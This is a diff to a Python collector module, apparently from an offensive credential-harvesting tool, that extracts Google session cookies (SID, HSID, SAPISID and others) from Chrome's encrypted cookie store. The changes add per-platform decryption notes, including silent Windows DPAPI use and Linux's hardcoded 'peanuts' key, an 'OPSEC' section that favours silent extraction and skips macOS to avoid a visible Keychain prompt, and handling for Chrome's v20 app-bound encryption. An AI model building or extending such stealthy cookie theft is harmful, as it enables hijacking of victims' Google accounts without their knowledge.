@@ -3,6 +3,15 @@
 Extracts Google session cookies (SID, HSID, SSID, APISID, SAPISID, etc.)
 from Chrome's encrypted Cookies database using the chromium_decrypt module.
 
+Cross-platform support:
+  - macOS:   PBKDF2(Keychain password) — SKIPPED by default (Keychain prompt)
+  - Windows: DPAPI via CryptUnprotectData (silent). Key read from
+             %LOCALAPPDATA%/Google/Chrome/User Data/Local State.
+  - Linux:   PBKDF2 with 'peanuts' hardcoded key (Chrome v10 default).
+             Falls back to 'peanuts' if Local State key is missing or zero.
+  - v20 app-bound encryption (Chrome 127+, Windows only): cookies encrypted
+    via IElevation COM (requires SYSTEM). Logged + skipped for non-SYSTEM.
+
 OPSEC:
   - Windows/Linux: SILENT (DPAPI / hardcoded 'peanuts' key)
   - macOS: SKIPPED by default (Keychain prompt is user-visible)
@@ -10,6 +19,7 @@ OPSEC:
 
 from __future__ import annotations
 
+import logging
 from typing import List
 
 from ..base import BaseCollector
@@ -17,6 +27,8 @@ from .. import CollectorRegistry
 from ...types import CollectedToken, DiscoveredToken
 from ...secure import secure
 from ...platform_utils import chrome_user_data_dir, get_platform
+
+logger = logging.getLogger(__name__)
 
 
 # Google session cookie names used for authenticated API access
@@ -72,7 +84,23 @@ class GoogleBrowserCookiesCollector(BaseCollector):
             )
             return []
 
-        from ...core.chromium_decrypt import extract_cookies, get_chrome_key, DecryptError
+        from ...core.chromium_decrypt import (
+            extract_cookies,
+            get_chrome_key,
+            DecryptError,
+            detect_chrome_version,
+            is_app_bound_encryption,
+        )
+
+        version = detect_chrome_version()
+        if is_app_bound_encryption(version):
+            ver_str = ".".join(str(x) for x in version) if version else "unknown"
+            logger.warning(
+                "Chrome %s detected — v20 app-bound cookies cannot be decrypted "
+                "without SYSTEM privileges (IElevation COM). v10 cookies will "
+                "still be extracted normally.",
+                ver_str,
+            )
 
         try:
             key = get_chrome_key(allow_prompt=False)
